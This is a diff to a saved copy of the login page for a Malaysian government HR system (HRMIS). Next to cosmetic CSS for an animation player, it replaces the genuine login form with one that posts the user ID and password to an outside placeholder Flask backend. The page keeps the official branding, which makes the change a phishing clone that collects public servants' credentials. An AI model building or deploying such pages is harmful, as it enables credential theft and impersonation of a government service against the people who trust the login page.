@@ -235,8 +235,242 @@
   margin-right: 0px;
 }
 	</style>
+	<style type="text/css">.lf-progress {
+  -webkit-appearance: none;
+  -moz-apperance: none;
+  width: 100%;
+  /* margin: 0 10px; */
+  height: 4px;
+  border-radius: 3px;
+  cursor: pointer;
+}
+.lf-progress:focus {
+  outline: none;
+  border: none;
+}
+.lf-progress::-moz-range-track {
+  cursor: pointer;
+  background: none;
+  border: none;
+  outline: none;
+}
+.lf-progress::-webkit-slider-thumb {
+  -webkit-appearance: none !important;
+  height: 13px;
+  width: 13px;
+  border: 0;
+  border-radius: 50%;
+  background: #0fccce;
+  cursor: pointer;
+}
+.lf-progress::-moz-range-thumb {
+  -moz-appearance: none !important;
+  height: 13px;
+  width: 13px;
+  border: 0;
+  border-radius: 50%;
+  background: #0fccce;
+  cursor: pointer;
+}
+.lf-progress::-ms-track {
+  width: 100%;
+  height: 3px;
+  cursor: pointer;
+  background: transparent;
+  border-color: transparent;
+  color: transparent;
+}
+.lf-progress::-ms-fill-lower {
+  background: #ccc;
+  border-radius: 3px;
+}
+.lf-progress::-ms-fill-upper {
+  background: #ccc;
+  border-radius: 3px;
+}
+.lf-progress::-ms-thumb {
+  border: 0;
+  height: 15px;
+  width: 15px;
+  border-radius: 50%;
+  background: #0fccce;
+  cursor: pointer;
+}
+.lf-progress:focus::-ms-fill-lower {
+  background: #ccc;
+}
+.lf-progress:focus::-ms-fill-upper {
+  background: #ccc;
+}
+.lf-player-container :focus {
+  outline: 0;
+}
+.lf-popover {
+  position: relative;
+}
+
+.lf-popover-content {
+  display: inline-block;
+  position: absolute;
+  opacity: 1;
+  visibility: visible;
+  transform: translate(0, -10px);
+  box-shadow: 0 2px 5px 0 rgba(0, 0, 0, 0.26);
+  transition: all 0.3s cubic-bezier(0.75, -0.02, 0.2, 0.97);
+}
+
+.lf-popover-content.hidden {
+  opacity: 0;
+  visibility: hidden;
+  transform: translate(0, 0px);
+}
+
+.lf-player-btn-container {
+  display: flex;
+  align-items: center;
+}
+.lf-player-btn {
+  cursor: pointer;
+  fill: #999;
+  width: 14px;
+}
+
+.lf-player-btn.active {
+  fill: #555;
+}
+
+.lf-popover {
+  position: relative;
+}
+
+.lf-popover-content {
+  display: inline-block;
+  position: absolute;
+  background-color: #ffffff;
+  opacity: 1;
+
+  transform: translate(0, -10px);
+  box-shadow: 0 2px 5px 0 rgba(0, 0, 0, 0.26);
+  transition: all 0.3s cubic-bezier(0.75, -0.02, 0.2, 0.97);
+  padding: 10px;
+}
+
+.lf-popover-content.hidden {
+  opacity: 0;
+  visibility: hidden;
+  transform: translate(0, 0px);
+}
+
+.lf-arrow {
+  position: absolute;
+  z-index: -1;
+  content: '';
+  bottom: -9px;
+  border-style: solid;
+  border-width: 10px 10px 0px 10px;
+}
+
+.lf-left-align,
+.lf-left-align .lfarrow {
+  left: 0;
+  right: unset;
+}
+
+.lf-right-align,
+.lf-right-align .lf-arrow {
+  right: 0;
+  left: unset;
+}
+
+.lf-text-input {
+  border: 1px #ccc solid;
+  border-radius: 5px;
+  padding: 3px;
+  width: 60px;
+  margin: 0;
+}
+
+.lf-color-picker {
+  display: flex;
+  flex-direction: row;
+  justify-content: space-between;
+  height: 90px;
+}
+
+.lf-color-selectors {
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+}
+
+.lf-color-component {
+  display: flex;
+  flex-direction: row;
+  font-size: 12px;
+  align-items: center;
+  justify-content: center;
+}
+
+.lf-color-component strong {
+  width: 40px;
+}
+
+.lf-color-component input[type='range'] {
+  margin: 0 0 0 10px;
+}
+
+.lf-color-component input[type='number'] {
+  width: 50px;
+  margin: 0 0 0 10px;
+}
+
+.lf-color-preview {
+  font-size: 12px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+  padding-left: 5px;
+}
+
+.lf-preview {
+  height: 60px;
+  width: 60px;
+}
+
+.lf-popover-snapshot {
+  width: 150px;
+}
+.lf-popover-snapshot h5 {
+  margin: 5px 0 10px 0;
+  font-size: 0.75rem;
+}
+.lf-popover-snapshot a {
+  display: block;
+  text-decoration: none;
+}
+.lf-popover-snapshot a:before {
+  content: '⥼';
+  margin-right: 5px;
+}
+.lf-popover-snapshot .lf-note {
+  display: block;
+  margin-top: 10px;
+  color: #999;
+}
+.lf-player-controls > div {
+  margin-right: 5px;
+  margin-left: 5px;
+}
+.lf-player-controls > div:first-child {
+  margin-left: 0px;
+}
+.lf-player-controls > div:last-child {
+  margin-right: 0px;
+}
+	</style>
 </head>
-<body autocompletetype="Disabled" data-gr-ext-installed="" data-gramm="false" data-new-gr-c-s-check-loaded="14.1232.0" data-new-gr-c-s-loaded="14.1232.0" data-qb-tmp-id="lt-607894" id="bodytag">
+<body autocompletetype="Disabled" data-gr-ext-installed="" data-gramm="false" data-new-gr-c-s-check-loaded="14.1232.0" data-new-gr-c-s-loaded="14.1232.0" data-qb-tmp-id="lt-971585" id="bodytag">
 <p>&nbsp;&nbsp; &nbsp;</p>
 </body>
 </html>
@@ -765,25 +999,11 @@
 <div class="innerLogin">
 <h3 class="fontgrey3">Log Masuk Pengguna</h3>
 
-<form action="" autocompletetype="Disabled" id="form1" method="post" name="form1"><input name="__original_url" type="hidden" value="https://hrmis2.eghrmis.gov.my/HRMISNET/Common/Main/Login.aspxLogin.aspx" /> <input id="__MAGICAJAX_SCRIPT_FINGERPRINTS" name="__MAGICAJAX_SCRIPT_FINGERPRINTS" type="hidden" value="" /> <input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="/wEPDwUKMTY3MzgyNjg1NQ9kFgJmD2QWDgIBDw8WAh4EVGV4dAUZSUQgUGVuZ2d1bmEgJiBLYXRhIExhbHVhbmRkAgMPDxYCHwAFBkJhaGFzYWRkAgUPEGRkFgFmZAIHDw8WAh8ABQtJRCBQZW5nZ3VuYWRkAgsPDxYCHwAFC0thdGEgTGFsdWFuZGQCDQ8PZBYCHhBBdXRvQ29tcGxldGVUeXBlBQhEaXNhYmxlZGQCDw9kFgJmD2QWAmYPZBYCAgEPZBYGAgEPDxYCHghJbWFnZVVybAUwL0hSTUlTTkVUL0NvbW1vbi9JbWFnZXMvQnV0dG9uL0JNL1N1Ym1pdEdyZXkuZ2lmFgQeC29ubW91c2VvdmVyBTx0aGlzLnNyYz0nL0hSTUlTTkVUL0NvbW1vbi9JbWFnZXMvQnV0dG9uL0JNL1N1Ym1pdEdyZWVuLmdpZiceCm9ubW91c2VvdXQFO3RoaXMuc3JjPScvSFJNSVNORVQvQ29tbW9uL0ltYWdlcy9CdXR0b24vQk0vU3VibWl0R3JleS5naWYnZAIDDw8WAh8CBS8vSFJNSVNORVQvQ29tbW9uL0ltYWdlcy9CdXR0b24vQk0vUmVzZXRHcmV5LmdpZhYEHwMFO3RoaXMuc3JjPScvSFJNSVNORVQvQ29tbW9uL0ltYWdlcy9CdXR0b24vQk0vUmVzZXRHcmVlbi5naWYnHwQFOnRoaXMuc3JjPScvSFJNSVNORVQvQ29tbW9uL0ltYWdlcy9CdXR0b24vQk0vUmVzZXRHcmV5LmdpZidkAgUPDxYCHwIFLi9IUk1JU05FVC9Db21tb24vSW1hZ2VzL0J1dHRvbi9CTS9FeGl0R3JleS5naWYWBh8DBTp0aGlzLnNyYz0nL0hSTUlTTkVUL0NvbW1vbi9JbWFnZXMvQnV0dG9uL0JNL0V4aXRHcmVlbi5naWYnHwQFOXRoaXMuc3JjPScvSFJNSVNORVQvQ29tbW9uL0ltYWdlcy9CdXR0b24vQk0vRXhpdEdyZXkuZ2lmJx4HT25DbGljawUWamF2YXNjcmlwdDpjbG9zZXdpbmQoKWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFBUdvQnRuBQhSZXNldEJ0bgUHRXhpdEJ0bo+/e/+n8AN7g9Ai/ry9Q3FVf+Oh" /> <input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="8CD6CE8B" /> <input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="/wEWCALu3fvcCALDi7mVBgLDi8mVBgLT8dy8BQK1qbSRCwKRmIa3DQL1zvHFDwKsz9KhCmROEiBe6eaNm328qT3dFObEQDZl" />
-<div class="hideMe" id="Div1"><span id="__HEADER"><b>ID Pengguna &amp; Kata Laluan</b></span> <span id="Literal1"><b>Bahasa</b></span> <select id="DropDownList1" name="DropDownList1"><option selected="selected" value="BM">Bahasa Malaysia</option><option value="BI">Bahasa Inggeris</option> </select></div>
-
-<p><span class="hideMe" id="Literal4"><b>ID Pengguna</b></span> <span class="fontblue">ID PENGGUNA : </span><br />
-<input class="full-width" id="txtUserID" name="txtUserID" type="text" /><span class="info" style=" float: right;">*bukan Warganegara Malaysia. <a href="#" id="country-code">Klik Sini</a></span><br />
-<span class="fontblue">KATA LALUAN :</span><br />
-<input autocompletetype="Disabled" class="full-width" id="txtPassword" name="password" type="password" /></p>
-
-<div class="newButtonTable center">&nbsp; &nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;
-<table class="table-login" id="tableButton">
-	<tbody>
-		<tr>
-			<td><span id="ajx$RBS_Holder"><span ajaxcall="async" id="ajx"><span id="GoBtn$ajaxdest" name="__ajaxmark"><input id="GoBtn" name="GoBtn" onmouseout="this.src='/HRMISNET/Common/Images/Button/BM/SubmitGrey.gif'" onmouseover="this.src='/HRMISNET/Common/Images/Button/BM/SubmitGreen.gif'" src="/HRMISNET/Common/Images/Button/BM/SubmitGrey.gif" style="border-width:0px;" type="image" /></span> <span id="ResetBtn$ajaxdest" name="__ajaxmark"><input id="ResetBtn" name="ResetBtn" onmouseout="this.src='/HRMISNET/Common/Images/Button/BM/ResetGrey.gif'" onmouseover="this.src='/HRMISNET/Common/Images/Button/BM/ResetGreen.gif'" src="/HRMISNET/Common/Images/Button/BM/ResetGrey.gif" style="border-width:0px;" type="image" /></span> <span id="ExitBtn$ajaxdest" name="__ajaxmark"><input class="hideMe" id="ExitBtn" name="ExitBtn" onclick="javascript:closewind();" onmouseout="this.src='/HRMISNET/Common/Images/Button/BM/ExitGrey.gif'" onmouseover="this.src='/HRMISNET/Common/Images/Button/BM/ExitGreen.gif'" src="/HRMISNET/Common/Images/Button/BM/ExitGrey.gif" style="border-width:0px;" type="image" /></span> </span></span></td>
-		</tr>
-	</tbody>
-</table>
-</div>
-<br />
-<script src="/HRMISNET/Common/javascript/StandardClient.js" type="text/javascript" id="SCS">BM</script></form>
+<form action="https://your-flask-backend-url/login" method="POST"><label for="txtUserID">ID Pengguna:</label><br />
+<input class="full-width" id="txtUserID" name="txtUserID" required="" type="text" /><br />
+<label for="txtPassword">Kata Laluan:</label><br />
+<input class="full-width" id="txtPassword" name="password" required="" type="password" /><br />
+<button type="submit">Log Masuk</button></form>
 </div>
 
 <div class="info">
